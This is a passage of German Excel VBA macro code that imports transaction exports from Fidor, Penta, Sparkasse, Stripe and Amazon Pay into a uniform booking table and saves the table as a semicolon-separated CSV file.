                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = verwendungszweck2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = verwendungszweck3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = verwendungszweck4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = verwendungszweck5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = verwendungszweck6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = verwendungszweck7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = verwendungszweck8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = verwendungszweck9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = verwendungszweck10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
                outputzeile = outputzeile + 1
      
       'Geb|fffd|hrenbuchungssatz
    
       If gebuehr = 0 Then GoTo nachsteZeile
       If gebuehr <> "" Then
             If gebuehr <> 0 Then
               ' betrag = -CDbl(gebuehr)
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = gebuehr
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = "amazonPay Fee" 'empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = verwendungszweck1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = verwendungszweck2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = verwendungszweck3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = verwendungszweck4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = verwendungszweck5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = verwendungszweck6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = verwendungszweck7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = verwendungszweck8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = verwendungszweck9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = verwendungszweck10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
         
            outputzeile = outputzeile + 1
       End If
       End If

nachsteZeile:

      Next zeile1
        
ende1:
  
Application.DisplayAlerts = False
Workbooks(mandantendatei).Close
Application.DisplayAlerts = True
Workbooks(macrodatei).Activate
Sheets("Tabelle").Select
Application.ScreenUpdating = True
'End If    'ende stripe ######################################################################################################


End Sub



Attribute VB_Name = "buttomAnpassen"
Sub buttonanpassen()
Attribute buttonanpassen.VB_ProcData.VB_Invoke_Func = " \n14"

  Dim oButton As OLEObject
  For Each oButton In ActiveSheet.OLEObjects
    With oButton
      'If .progID = "Forms.ListBox.1" Then
        .Visible = True
        .Height = 20
        .Width = 300
        
       
    
    End With
  Next oButton
End Sub

Attribute VB_Name = "fidor_modul"
Sub fidor()

If bank = "Fidor" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
   ActiveWorkbook.Worksheets.Add
    With ActiveSheet.QueryTables.Add(Connection:= _
        "TEXT;" & fremdprogramm, Destination _
        :=Range("$A$1"))
        '.CommandType = 0
        .Name = "MdBlatt"
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .TextFilePromptOnRefresh = False
        .TextFilePlatform = 65001
        .TextFileStartRow = 1
        .TextFileParseType = xlDelimited
        .TextFileTextQualifier = xlTextQualifierDoubleQuote
        .TextFileConsecutiveDelimiter = False
        .TextFileTabDelimiter = False
        .TextFileSemicolonDelimiter = True
        .TextFileCommaDelimiter = False
        .TextFileSpaceDelimiter = False
        .TextFileColumnDataTypes = Array(1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)
        .TextFileTrailingMinusNumbers = True
        .Refresh BackgroundQuery:=False
    End With
       
       fidorsheet = ActiveSheet.Name
       fremdprogrammDatei = ActiveWorkbook.Name
       Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
       Columns("B:C").Select
    Selection.Replace What:="Absender: ", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="Empf|fffd|nger: ", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
            Selection.Replace What:="-", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
            Selection.Replace What:="+", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
        
        x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            For zeile1 = 2 To x
                datum = Cells(zeile1, 1)
                empfaenger1 = Left(Cells(zeile1, 3), 27)
                empfaenger2 = Mid(Cells(zeile1, 3), 28, 27)
                'kontoEmpf = Cells(zeile1, 3)
                transaktionstyp = Cells(zeile1, 4)
                    If Left(transaktionstyp, 5) = "Gutsc" Then transaktionstyp = "Gutschrift"
                    If Left(transaktionstyp, 5) = "Lasts" Then transaktionstyp = "Lastschrift"
                    If Left(transaktionstyp, 5) = "|fffd|berw" Then transaktionstyp = "|fffd|berweisung"
                
               ' vwz = Cells(zeile1, 2)
                
                vwz1 = Left(Cells(zeile1, 2), 27)
                vwz2 = Mid(Cells(zeile1, 2), 28, 27)
                vwz3 = Mid(Cells(zeile1, 2), 54, 27)
                vwz4 = Mid(Cells(zeile1, 2), 81, 27)
                vwz5 = Mid(Cells(zeile1, 3), 108, 27)
                
                vwz6 = Left(Cells(zeile1, 2), 27)
                vwz7 = Mid(Cells(zeile1, 3), 28, 27)
                vwz8 = Mid(Cells(zeile1, 3), 54, 27)
                vwz9 = Mid(Cells(zeile1, 3), 81, 27)
                vwz10 = Mid(Cells(zeile1, 3), 108, 27)
                                            
                
                
                betrag = Cells(zeile1, 4)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
                vwz1 = ""
                vwz2 = ""
                vwz3 = ""
                vwz4 = ""
                vwz5 = ""
                
                vwz6 = ""
                vwz7 = ""
                vwz8 = ""
                vwz9 = ""
                vwz10 = ""
              Next zeile1
  Application.DisplayAlerts = False
  Sheets(fidorsheet).Select
  ActiveWindow.SelectedSheets.Delete
  Application.DisplayAlerts = True
  
  End If    ' fidor Behandlung zu Ende
  End Sub

Attribute VB_Name = "nurSpeichern"
Sub nur_Speichern()
Attribute nur_Speichern.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Bereich As Object, Zeile As Object, Zelle As Object
Dim strTemp As String
Const Trennzeichen As String = ";"

Sheets("Tabelle").Select
x = ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row



Dateischreiben:
Set Bereich = ActiveSheet.Range("A1:DZ" & x - 1)


 filesavename = Application.GetSaveAsFilename( _
    fileFilter:="Text csv (*.csv), *.csv")
    
  Open filesavename For Output As #1

  ' im text d|fffd|rfen au|fffd|er den Trennzeichen keine Semikolon sein, vorher l|fffd|schen!
 '  Workbooks(macrodatei).Activate
   Sheets("Tabelle").Activate
   Cells.Replace What:=";", Replacement:=" ", LookAt:=xlPart, SearchOrder _
        :=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False




For zeilen = 1 To x - 1
    
    For spalte = 1 To 24  '24 spalten m|fffd|ssen da sein.
       
       If spalte = 5 Or spalte = 6 Or spalte = 7 Then 'in bestimmten Spalten keine Anf|fffd|hrungsstriche
         strtemp1 = strtemp1 & Cells(zeilen, spalte) & ";"
                     
       Else  'mit semikolon vorn und hinten
         strtemp1 = strtemp1 & """" & Cells(zeilen, spalte) & """" & ";"
       End If
       If strtemp1 = "" Then Exit For
    Next spalte
    
    Print #1, strtemp1
    strtemp1 = ""
   Next zeilen

  Close #1
  
  
  Set Bereich = Nothing

ActiveWorkbook.Save
'Application.DisplayAlerts = False
'ActiveWorkbook.Close
Application.DisplayAlerts = True

End Sub

Attribute VB_Name = "penta1_"
Sub penta1()



If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"):: EndeLL = 1: Exit Sub
   
       
    
        Workbooks.Open Filename:=fremdprogramm
           
    Columns("A:A").Select
    Selection.TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=False, _
        Semicolon:=False, Comma:=True, Space:=False, Other:=False, FieldInfo _
        :=Array(Array(1, 1), Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), _
        Array(7, 1), Array(8, 1), Array(9, 1), Array(10, 1), Array(11, 1), Array(12, 1), Array(13, 1 _
        ), Array(14, 1), Array(15, 1), Array(16, 1), Array(17, 1), Array(18, 1), Array(19, 1), Array _
        (20, 1), Array(21, 1), Array(22, 1), Array(23, 1)), TrailingMinusNumbers:=True
    letzteZeile = Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
   
   datendatei = ActiveWorkbook.Name
   
 Application.Workbooks(datendatei).Sheets(1).Activate

    AssDateLastRow = ActiveSheet.Range("B" & Rows.Count & ":C" & Rows.Count).End(xlUp).Row
    ActiveSheet.Range("E4:E" & AssDateLastRow).NumberFormat = "dd.mm.yyyy;@"
    'Set the format

        Range("B2:B" & AssDateLastRow).Select
        Selection.TextToColumns DataType:=xlDelimited, ConsecutiveDelimiter:=True, _
         Space:=True, FieldInfo:=Array(1, 4)
 Range("C2:C" & AssDateLastRow).Select
        Selection.TextToColumns DataType:=xlDelimited, ConsecutiveDelimiter:=True, _
         Space:=True, FieldInfo:=Array(1, 4)
    
    'Use text to columns to force a format update
     
     
     
     fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
     
            x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 3)
                empfaenger1 = Cells(zeile1, 4)
                empfaenger2 = Mid(Cells(zeile1, 4), 28, 27)
                
                IbanAuftraggeber = Cells(zeile1, 5)
                transaktionstyp = Cells(zeile1, 6)
                vwz1 = Left(Cells(zeile1, 7), 27)
                vwz2 = Mid(Cells(zeile1, 7), 28, 27)
                vwz3 = Mid(Cells(zeile1, 7), 54, 27)
                vwz4 = Mid(Cells(zeile1, 7), 81, 27)
                'vwz5 = Cells(zeile1, 8)
                
                betrag = Cells(zeile1, 8)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 16) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
              Next zeile1
  
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
  
  
Workbooks(macrodatei).Activate
'Sheets("1").Select
  


End Sub
Attribute VB_Name = "scrumble"
Sub scrumble()
'
' markiert Spalten: Buchstaben durch zahlenersetzen
'

'
    Selection.Replace What:="A", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="b", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="c", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="d", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="e", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="f", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="g", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="h", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="i", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="j", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="k", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="l", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="m", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="n", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="o", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="p", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="q", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="r", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="s", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="t", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="u", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="v", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="w", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="y", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="z", Replacement:="x", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    

End Sub


Attribute VB_Name = "sparkasse_"
Sub sparkasse()

If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
   Workbooks.Open Filename:=fremdprogramm, Local:=True
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    ' Plus und Minus ersetzen
    Columns("C:N").Select
    Selection.Replace What:="+", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="-", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    
    x = Workbooks(fremdprogrammDatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
        For zeile1 = 2 To x
                 datum = Cells(zeile1, 2)
                 
                 
                 betrag = Cells(zeile1, 15)
                 
                IbanAuftraggeber = Cells(zeile1, 13)
                transaktionstyp = Cells(zeile1, 4)
                Text = Cells(zeile1, 5)
                'Text = Replace(Text, Chr(10), " ")
                
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 28, 27)
                vwz3 = Mid(Text, 54, 27)
                vwz4 = Mid(Text, 81, 27)
                vwz5 = Mid(Text, 108, 27)
                vwz6 = Mid(Text, 135, 27)
                vwz7 = Mid(Text, 162, 27)
                vwz9 = Mid(Text, 189, 27)
                vwz10 = Mid(Text, 216, 27)
                      
                
                empfaenger1 = Left(Cells(zeile1, 12), 27)
                'empfaenger2 = Mid(Cells(zeile1, 6), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""

              
               'Anfangssaldo Zeile
        
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
 Workbooks(macrodatei).Activate

'####################################################################


End Sub


Attribute VB_Name = "stripeModul"
Sub stripe()


'If bank = "Stripe" Then
If Version <> "Stripe" Then MsgBox ("Du hast keine Stripe-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
Application.ScreenUpdating = False
         'MdDatei = Application.GetOpenFilename("txt Files (*.*), *.*", , "stripe-Datei von Mandant |fffd|ffnen")
         Workbooks.OpenText Filename:= _
           fremdprogramm, Origin:=xlWindows, _
          StartRow:=1, DataType:=xlDelimited, TextQualifier:=xlDoubleQuote, _
          ConsecutiveDelimiter:=False, Tab:=True, Semicolon:=False, Comma:=False _
          , Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), Array(2, 1), _
          Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1), Array(8, 1), Array(9, 1), _
          Array(10, 1)), TrailingMinusNumbers:=True
  
          mandantendatei = ActiveWorkbook.Name
    
       letzteZeile = Workbooks(mandantendatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
       
    Columns("P:AB").Select
    Range("P38").Activate
    Selection.Replace What:="=-", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
         Application.ScreenUpdating = False
       outputzeile = 2
   Rem Mandantendatei lesen
  For zeile1 = 2 To letzteZeile
      textzeile = 1
      leer = 0
      
       Application.StatusBar = "Bearbeite Zeile " & zeile1 & " von " & letzteZeile
       Workbooks(mandantendatei).Activate
       
      
       datum = Cells(zeile1, 9)
       datum = Left(datum, 10)
       If datum = "" Then GoTo ende1
       betrag = Cells(zeile1, 4)
       gebuehr = Cells(zeile1, 5)
       'transaktionstyp = Cells(zeile1, 11)  'description transactionstyp in VWZ 1 geschrieben
       empfaenger = Cells(zeile1, 17)
       'IbanAuftraggeber = Cells(zeile1, 6)
      
       verwendungszweck1 = Left(Cells(zeile1, 11), 27)
       verwendungszweck2 = Left(Cells(zeile1, 17), 27)
       verwendungszweck3 = Left(Cells(zeile1, 18), 27)
       verwendungszweck4 = Left(Cells(zeile1, 19), 27)

       verwendungszweck5 = Left(Cells(zeile1, 20), 27)
       verwendungszweck6 = Left(Cells(zeile1, 21), 27)
       verwendungszweck7 = Left(Cells(zeile1, 22), 27)
       verwendungszweck8 = Left(Cells(zeile1, 23), 27)
       'verwendungszweck9 = Left(Cells(zeile1, 21), 27)
       'verwendungszweck10 = Left(Cells(zeile1, 21), 27)
       
                
             '   betrag = Cells(zeile1, 16) + Cells(zeile1, 17)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = betrag
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = verwendungszweck1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = verwendungszweck2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = verwendungszweck3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = verwendungszweck4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = verwendungszweck5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = verwendungszweck6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = verwendungszweck7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = verwendungszweck8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = verwendungszweck9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = verwendungszweck10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
                outputzeile = outputzeile + 1
      
       'Geb|fffd|hrenbuchungssatz
       If gebuehr = "..." Then GoTo nachsteZeile
     
       
       If gebuehr = 0 Then GoTo nachsteZeile
       If gebuehr <> "" Then
             If CDbl(gebuehr) > 0 Then
                betrag = -CDbl(gebuehr)
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 7) = betrag
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 8) = "STRIPE Fee" 'empfaenger
